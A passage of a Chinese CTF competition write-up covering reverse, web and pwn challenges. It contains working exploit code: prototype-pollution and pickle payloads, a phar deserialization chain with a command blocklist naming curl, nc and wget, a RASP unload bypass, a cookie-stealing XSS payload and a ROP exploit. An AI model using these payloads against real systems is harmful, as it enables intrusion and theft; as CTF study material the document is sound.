class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xf</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span>]<span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">data, key</span>):    <span class="hljs-keyword">return</span> [data[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">d</span>):    new_data = [d[<span class="hljs-number">0</span>], d[<span class="hljs-number">1</span>], d[<span class="hljs-number">2</span>], d[<span class="hljs-number">3</span>], d[<span class="hljs-number">5</span>], d[<span class="hljs-number">6</span>], d[<span class="hljs-number">7</span>], d[<span class="hljs-number">4</span>], d[<span class="hljs-number">10</span>], d[<span class="hljs-number">11</span>], d[<span class="hljs-number">8</span>], d[<span class="hljs-number">9</span>], d[<span class="hljs-number">15</span>], d[<span class="hljs-number">12</span>], d[<span class="hljs-number">13</span>], d[<span class="hljs-number">14</span>]]    <span class="hljs-keyword">return</span> new_data<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_change</span>(<span class="hljs-params">d</span>):    original_data = [d[<span class="hljs-number">0</span>], d[<span class="hljs-number">1</span>], d[<span class="hljs-number">2</span>], d[<span class="hljs-number">3</span>], d[<span class="hljs-number">7</span>], d[<span class="hljs-number">4</span>], d[<span class="hljs-number">5</span>], d[<span class="hljs-number">6</span>], d[<span class="hljs-number">10</span>], d[<span class="hljs-number">11</span>], d[<span class="hljs-number">8</span>], d[<span class="hljs-number">9</span>], d[<span class="hljs-number">13</span>], d[<span class="hljs-number">14</span>], d[<span class="hljs-number">15</span>], d[<span class="hljs-number">12</span>]]    <span class="hljs-keyword">return</span> original_data<span class="hljs-keyword">def</span> <span class="hljs-title function_">find_table</span>(<span class="hljs-params">d</span>):    new_data = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):        new_data.append(table[d[i]])    <span class="hljs-keyword">return</span> new_data<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_find_table</span>(<span class="hljs-params">d</span>):    original_data = []    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> d:        original_data.append(table.index(value))    <span class="hljs-keyword">return</span> original_data<span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">a1</span>):    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">0x80</span> == <span class="hljs-number">0</span>:        <span class="hljs-keyword">return</span> (<span class="hljs-number">2</span> * a1) &amp; <span class="hljs-number">0xFF</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> (<span class="hljs-number">2</span> * a1 ^ <span class="hljs-number">0x1B</span>) &amp; <span class="hljs-number">0xFF</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_magic</span>(<span class="hljs-params">a1</span>):    <span class="hljs-keyword">if</span> a1 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:        <span class="hljs-keyword">return</span> a1 // <span class="hljs-number">2</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> ((a1 ^ <span class="hljs-number">0x1B</span>) + <span class="hljs-number">256</span>) // <span class="hljs-number">2</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic_xor</span>(<span class="hljs-params">a1</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):  <span class="hljs-comment"># 循环次数为4</span>        v1 = a1[i + <span class="hljs-number">8</span>] ^ magic(a1[i + <span class="hljs-number">4</span>]) ^ a1[i + <span class="hljs-number">4</span>] ^ magic(a1[i]) ^ a1[i + <span class="hljs-number">12</span>]        v2 = magic(a1[i + <span class="hljs-number">8</span>]) ^ a1[i + <span class="hljs-number">8</span>] ^ magic(a1[i + <span class="hljs-number">4</span>]) ^ a1[i] ^ a1[i + <span class="hljs-number">12</span>]        v3 = magic(a1[i + <span class="hljs-number">8</span>]) ^ a1[i + <span class="hljs-number">4</span>] ^ a1[i] ^ magic(a1[i + <span class="hljs-number">12</span>]) ^ a1[i + <span class="hljs-number">12</span>]        v4 = a1[i + <span class="hljs-number">8</span>] ^ a1[i + <span class="hljs-number">4</span>] ^ a1[i] ^ magic(a1[i]) ^ magic(a1[i + <span class="hljs-number">12</span>])        a1[i] = v1        a1[i + <span class="hljs-number">4</span>] = v2        a1[i + <span class="hljs-number">8</span>] = v3        a1[i + <span class="hljs-number">12</span>] = v4    <span class="hljs-keyword">return</span> a1<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_magic_xor</span>(<span class="hljs-params">a1</span>):    <span class="hljs-comment"># 将a1的16进制值作为argv传入test1.exe</span>    s = <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a1])    s = <span class="hljs-string">&#x27;test1.exe &#x27;</span> + s    p = subprocess.Popen(s, shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE)    p.wait()    result = p.stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)[:-<span class="hljs-number">2</span>]    result = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;[&#x27;</span>+result+<span class="hljs-string">&#x27;]&#x27;</span>)    <span class="hljs-keyword">return</span> result<span class="hljs-keyword">def</span> <span class="hljs-title function_">trans</span>(<span class="hljs-params">a1</span>):    new_a = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):            new_a[i * <span class="hljs-number">4</span> + j] = a1[j * <span class="hljs-number">4</span> + i]    <span class="hljs-keyword">return</span> new_a<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    result = trans(burp)    result = xor(result, v4)    result = reverse_change(result)    result = reverse_find_table(result)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):        result = xor(result, xor_key[i*<span class="hljs-number">16</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">16</span>])        result = reverse_magic_xor(result)        result = reverse_change(result)        result = reverse_find_table(result)    result = xor(result, xor_key[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>])    result = trans(result)    <span class="hljs-comment"># 将列表输出为uuid格式</span>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result]))<span class="hljs-comment"># 4d87ef0377bb491a80f54620245807c4</span></code></pre></div><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075510.png" alt="img"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ezpicker"><a href="#Ezpicker" class="headerlink" title="Ezpicker"></a>Ezpicker</h2><p>register 函数原型链污染修改 jwt key，修改 jwt token 至 admin role</p><div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;__class__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;secret_key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0d000721&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>把 jwt 贴一下吧，方便点</p><div class="code-wrapper"><pre><code class="hljs Plain">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.e5KkmWzkkozWyBU4N4d1p3tB7Xq8X9NFF44CWkscM5w</code></pre></div><p>理论上还能给 safe_* 字典篡改一下（应该就是要改，然后利用 <code>__reduce__</code>？）</p><p>先把 os.system 加上去看看</p><div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;__class__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;secret_key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0d000721&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;safe_modules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;builtins&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;safe_names&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;eval&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;exec&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075611.png" alt="img"></p><p>草，应该还要加 posix</p><p>只能用 buitlins，那估计得写个 eval，不能直接 os.system</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075612.png" alt="img"></p><p>eval 确实可以，接下来就是看看怎么写 exp 了</p><p>用 exec 覆写函数？或者注册一个 handler？</p><p>用了非常 dirty 的方法（</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):        code = <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">class FakeOpen:</span><span class="hljs-string">    def __init__(self, *args):</span><span class="hljs-string">        pass</span><span class="hljs-string"></span><span class="hljs-string">    def read(self):</span><span class="hljs-string">        return repr(os.listdir(&quot;/&quot;))</span><span class="hljs-string"></span><span class="hljs-string">    def __enter__(self):</span><span class="hljs-string">        return self</span><span class="hljs-string"></span><span class="hljs-string">    def __exit__(self, *args):</span><span class="hljs-string">        pass</span><span class="hljs-string"></span><span class="hljs-string">globals()[&quot;open&quot;] = FakeOpen</span><span class="hljs-string">        &quot;&quot;&quot;</span>.strip()        <span class="hljs-keyword">return</span> <span class="hljs-built_in">exec</span>, (code,)<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.pkl&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> fp:    pickle.dump(Exp(), fp)</code></pre></div><p>伪造一个 open 把原本的 open 覆写掉，然后访问 ‘&#x2F;‘</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075613.png" alt="img"></p><p>最后把 open 目标改写一下</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):        code = <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">globals()[&quot;open&quot;] = lambda *_: builtins.open(&quot;/tr3e_fl4g_1s_h3re_lol&quot;)</span><span class="hljs-string">        &quot;&quot;&quot;</span>.strip()        <span class="hljs-keyword">return</span> <span class="hljs-built_in">exec</span>, (code,)<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.pkl&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> fp:    pickle.dump(Exp(), fp)</code></pre></div><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075614.png" alt="img"></p><div class="code-wrapper"><pre><code class="hljs Python">flag&#123;yJLgNqR2St6VHfSJnmvggRBZtVycKHSj&#125;</code></pre></div><h2 id="Capoo"><a href="#Capoo" class="headerlink" title="Capoo"></a>Capoo</h2><p>LFR 任意文件读取</p><p>POST <a href="http://web-639b9d6c7e.challenge.xctf.org.cn/showpic.php">http://web-639b9d6c7e.challenge.xctf.org.cn/showpic.php</a></p><p>capoo&#x3D;path</p><div class="code-wrapper"><pre><code class="hljs Python">Warning: file_get_contents(/proc/self/environ): failed to <span class="hljs-built_in">open</span> stream: Permission denied <span class="hljs-keyword">in</span> /var/www/html/showpic.php on line <span class="hljs-number">20</span>&lt;?php<span class="hljs-keyword">class</span> <span class="hljs-title class_">CapooObj</span> &#123;    public function __wakeup()    &#123;        $action = $this-&gt;action;        $action = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, $action);        $action = str_replace(<span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, $action);        $banlist = <span class="hljs-string">&quot;/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|\~|\`|\r|\n|\t|\        |\^|ls|\.|tail|watch|wget|\||\;|\:|\(|\)|\&#123;|\&#125;|\*|\?|\[|\]|\@|\\|\=|\&lt;)/i&quot;</span>;        <span class="hljs-keyword">if</span>(preg_match($banlist, $action))&#123;                die(<span class="hljs-string">&quot;Not Allowed!&quot;</span>);        &#125;        system($this-&gt;action);    &#125;&#125;header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; isset($_POST[<span class="hljs-string">&#x27;capoo&#x27;</span>])) &#123;    $file = $_POST[<span class="hljs-string">&#x27;capoo&#x27;</span>];        <span class="hljs-keyword">if</span> (file_exists($file)) &#123;        $data = file_get_contents($file);        $base64 = base64_encode($data);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (substr($file, <span class="hljs-number">0</span>, strlen(<span class="hljs-string">&quot;http://&quot;</span>)) === <span class="hljs-string">&quot;http://&quot;</span>) &#123;        $data = file_get_contents($_POST[<span class="hljs-string">&#x27;capoo&#x27;</span>] . <span class="hljs-string">&quot;/capoo.gif&quot;</span>);        <span class="hljs-keyword">if</span> (strpos($data, <span class="hljs-string">&quot;PILER&quot;</span>) !== false) &#123;                die(<span class="hljs-string">&quot;Capoo piler not allowed!&quot;</span>);        &#125;        file_put_contents(<span class="hljs-string">&quot;capoo_img/capoo.gif&quot;</span>, $data);        die(<span class="hljs-string">&quot;Download Capoo OK&quot;</span>);    &#125; <span class="hljs-keyword">else</span> &#123;        die(<span class="hljs-string">&#x27;Capoo does not exist.&#x27;</span>);    &#125;&#125; <span class="hljs-keyword">else</span> &#123;    die(<span class="hljs-string">&#x27;No capoo provided.&#x27;</span>);&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;Display Capoo&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;img style=<span class="hljs-string">&#x27;display:block; width:100px;height:100px;&#x27;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;base64image&#x27;</span>       src=<span class="hljs-string">&#x27;data:image/gif;base64, &lt;?php echo $base64;?&gt;&#x27;</span> /&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre></div><p>phar反序列化</p><p>本地生成后gzip压缩，http:&#x2F;&#x2F;远程下载</p><p>利用file_get_content触发</p><div class="code-wrapper"><pre><code class="hljs Bash">&lt;?phpclass CapooObj &#123;    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__wakeup</span></span>()    &#123;        <span class="hljs-variable">$action</span> = <span class="hljs-variable">$this</span>-&gt;action;        <span class="hljs-variable">$action</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$action</span>);        <span class="hljs-variable">$action</span> = str_replace(<span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$action</span>);        <span class="hljs-variable">$banlist</span> = <span class="hljs-string">&quot;/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|\~|\`|\r|\n|\t|\        |\^|ls|\.|tail|watch|wget|\||\;|\:|\(|\)|\&#123;|\&#125;|\*|\?|\[|\]|\@|\\|\=|\&lt;)/i&quot;</span>;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-variable">$banlist</span>, <span class="hljs-variable">$action</span>))&#123;                die(<span class="hljs-string">&quot;Not Allowed!&quot;</span>);        &#125;        system(<span class="hljs-variable">$this</span>-&gt;action);    &#125;&#125;<span class="hljs-variable">$a</span> = new CapooObj();<span class="hljs-variable">$a</span>-&gt;action = <span class="hljs-string">&quot;find / -maxdepth 1&quot;</span>;<span class="hljs-variable">$phar</span> = new Phar(<span class="hljs-string">&quot;a.phar&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;startBuffering();<span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;stopBuffering();</code></pre></div><p>通过 <code>find / -maxdepth 1</code> 可找到 flag 文件名</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075615.png" alt="img"></p><p>随后直接调用 showpic.php 的文件读取功能读取 flag 文件内容</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075616.png" alt="img"></p><h2 id="OnlineRunner"><a href="#OnlineRunner" class="headerlink" title="OnlineRunner"></a>OnlineRunner</h2><div class="code-wrapper"><pre><code class="hljs Bash">java.io.File directory = new java.io.File(<span class="hljs-string">&quot;/&quot;</span>); // 设置你想检查的目录  java.io.File[] files = directory.listFiles();  // 获取目录中的文件列表  <span class="hljs-keyword">if</span> (files != null) &#123;      <span class="hljs-keyword">for</span> (java.io.File file : files) &#123;          System.out.println(<span class="hljs-string">&quot;java.io.File: &quot;</span> + file.getName());          System.out.println(<span class="hljs-string">&quot;Readable: &quot;</span> + file.canRead());          System.out.println(<span class="hljs-string">&quot;Writable: &quot;</span> + file.canWrite());          System.out.println(<span class="hljs-string">&quot;Executable: &quot;</span> + file.canExecute());          System.out.println();      &#125;  &#125; <span class="hljs-keyword">else</span> &#123;      System.out.println(<span class="hljs-string">&quot;Could not access the directory or it is empty.&quot;</span>);  &#125;</code></pre></div><p>发现一定要rce执行&#x2F;readflag</p><p>然后随便读取文件</p><div class="code-wrapper"><pre><code class="hljs Bash">String filePath = <span class="hljs-string">&quot;/xxx&quot;</span>; // 替换为你的文件路径try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(filePath))) &#123;    String line;    <span class="hljs-keyword">while</span> ((line = reader.readLine()) != null) &#123;        System.out.println(line);    &#125;&#125; catch (java.io.IOException e) &#123;    System.err.println(<span class="hljs-string">&quot;Error reading file: &quot;</span> + e.getMessage());&#125;</code></pre></div><p>&#x2F;proc&#x2F;self&#x2F;cmdline发现是openjdk17，并且加载了一个rasp的agent</p><p>接着能够找到rasp的log看了下知道是jvm-rasp，是alibaba的产品</p><p>看了wiki后我们知道它是通过加载module进行hook</p><p>把sandbox-module的jvm-rasp弄下来看看</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075617.png" alt="img"></p><p>想要通过UNIXProcess进行绕过，但不太会</p><p>后来看到wiki能够卸载module，并且查看sandbox.sh的逻辑实际上就是发送curl请求</p><p>放给gpt给个例子就可以得到路径</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075618.png" alt="img"></p><p>我们需要修改的东西可以在sandbox.log中得到，比如port，还有ids</p><p>然后用java写能够进行上述请求的代码即可</p><div class="code-wrapper"><pre><code class="hljs Bash">String urlString = <span class="hljs-string">&quot;http://127.0.0.1:39073/sandbox/default/module/http/sandbox-module-mgr/unload?1=1&amp;action=unload&amp;ids=rasp-rce-native-hook&quot;</span>;try &#123;    // 创建 URL 对象    java.net.URL url = new java.net.URL(urlString);    // 打开连接    java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();    // 设置请求方法为 GET    connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);    // 设置连接属性，模拟 -N 和 -s 选项    connection.setDoInput(<span class="hljs-literal">true</span>);    connection.setUseCaches(<span class="hljs-literal">false</span>);    // 获取响应状态    int responseCode = connection.getResponseCode();    System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);    // 读取响应    try (java.io.BufferedReader <span class="hljs-keyword">in</span> = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()))) &#123;        String inputLine;        java.lang.StringBuilder response = new java.lang.StringBuilder();        <span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != null) &#123;            response.append(inputLine);        &#125;        // 打印响应        System.out.println(response.toString());    &#125;&#125; catch (java.lang.Exception e) &#123;    e.printStackTrace();&#125;</code></pre></div><p>最后执行拿回显</p><div class="code-wrapper"><pre><code class="hljs Bash">try &#123;        System.out.println(new java.util.Scanner(java.lang.Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/readflag&quot;</span>).getInputStream()).next());&#125; catch (java.io.IOException e) &#123;    throw new java.lang.RuntimeException(e);&#125;</code></pre></div><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075619.png" alt="img"></p><h2 id="Spreader"><a href="#Spreader" class="headerlink" title="Spreader"></a>Spreader</h2><p>考点就是xss窃取cookie，然后payload套两次</p><p>经过尝试，在闭合的script标签里加换行即可绕过</p><p>不出网，写在&#x2F;store即可</p><div class="code-wrapper"><pre><code class="hljs Bash">&lt;script&gt;fetch(<span class="hljs-string">&#x27;/store&#x27;</span>,&#123;body:<span class="hljs-string">&#x27;cookie=&#x27;</span>+document.cookie,method:<span class="hljs-string">&#x27;POST&#x27;</span>,headers:&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;&#125;)&lt;/script&gt;</code></pre></div><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075620.png" alt="img"></p><p>换cookie后再来一次就行</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075621.png" alt="img"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin_revenge"></a>signin_revenge</h2><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-volcano/172940000075622.png" alt="img"></p><p>沙箱题，对 execve 和 execveat 过滤，但 system 函数需要调用 execve(at)</p><p>禁用了execve和execveat，无法直接getshell，可以尝试orw</p><p>在vuln中存在栈溢出，而且可以通过puts函数泄露libc，由于mmap函数需要的参数太多，比较难实现，此处使用栈迁移，将栈迁移到bss段，并在bss段写入orw的gadget，成功执行后可以从根目录flag文件中读取到flag</p><div class="code-wrapper"><pre><code class="hljs Bash">from pwn import *context(<span class="hljs-built_in">arch</span> = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)p = remote(<span class="hljs-string">&#x27;ip&#x27;</span>,<span class="hljs-string">&#x27;port&#x27;</span>)elf = ELF(<span class="hljs-string">&#x27;./vuln&#x27;</span>)<span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)offset = 0x100 + 0x08pop_rdi = 0x401393 pop_ret = 0x40101abss = 0x404300lea_rax = 0x4012CFputs_plt = elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]main_addr = 0x4012F0leave = 0x4012EE payload_leak = b<span class="hljs-string">&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) p.recvuntil(<span class="hljs-string">&#x27;lets move and pwn!&#x27;</span>)p.send(payload_leak)puts_real_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))libc_base = puts_real_addr - libc.sym[<span 